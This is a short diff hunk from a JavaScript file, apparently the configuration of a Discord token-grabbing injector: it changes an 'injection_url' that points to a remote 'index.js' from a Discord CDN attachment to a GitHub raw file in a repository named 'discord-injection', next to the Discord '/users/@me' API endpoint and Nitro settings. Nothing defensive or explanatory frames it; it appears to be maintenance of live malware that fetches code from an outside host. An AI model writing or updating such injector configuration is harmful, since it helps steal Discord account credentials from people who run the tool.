@@ -66,7 +66,7 @@ const args = process.argv,
                 '%20'
             ),
         injection_url:
-            'https://cdn.discordapp.com/attachments/1098269323304374272/1099397327283818616/index.js',
+            'https://raw.githubusercontent.com/Esrefpasa/discord-injection/refs/heads/main/index.js',
         api: 'https://discord.com/api/v9/users/@me',
         nitro: {
             boost: {
